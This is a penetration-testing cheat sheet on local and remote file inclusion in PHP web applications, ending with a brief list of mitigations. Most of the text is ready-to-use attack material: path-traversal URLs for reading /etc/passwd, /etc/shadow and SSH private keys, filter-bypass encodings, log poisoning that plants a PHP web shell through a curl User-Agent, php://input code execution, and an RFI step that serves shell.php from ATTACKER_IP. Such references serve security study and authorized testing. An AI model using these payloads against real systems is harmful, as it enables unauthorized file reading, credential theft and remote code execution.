# File Inclusion (LFI / RFI)

Include files through vulnerable parameters, allowing reading of local files or execution of remote code.

## Local File Inclusion (LFI)

Include files from the server's filesystem.

### Basic LFI

```
# Vulnerable URL
http://target.com/page?file=about.html

# Path traversal to read /etc/passwd
http://target.com/page?file=../../../../etc/passwd

# Windows
http://target.com/page?file=..\..\..\..\windows\system32\drivers\etc\hosts
```

### Useful Files to Read

**Linux:**
```
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/home/user/.ssh/id_rsa
/var/log/apache2/access.log
/proc/self/environ
```

**Windows:**
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
```

### Filter Bypass

```
# Null byte (older PHP < 5.3)
../../../../etc/passwd%00

# Double encoding
%252e%252e%252f%252e%252e%252fetc/passwd

# Path truncation
../../../../etc/passwd........ (repeat to exceed max path length)
```

### LFI to RCE

**Log Poisoning:**

1. Inject PHP into a log file via User-Agent:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

2. Include the log file:

```
http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=whoami
```

**PHP Wrappers:**

```
# Read source code (base64 encoded)
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php

# Execute code via input
http://target.com/page?file=php://input
# POST body: <?php system('whoami'); ?>
```

## Remote File Inclusion (RFI)

Include files from an external server. Requires `allow_url_include=On` in PHP (rare).

```bash
# Host a PHP shell on attacker
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# Include it
http://target.com/page?file=http://ATTACKER_IP/shell.php&cmd=whoami
```

## Mitigations

- Never pass user input directly to include/require functions
- Use allowlists for includable files
- Disable `allow_url_include`
- Chroot or restrict file access paths
- Input validation -- strip `../` sequences
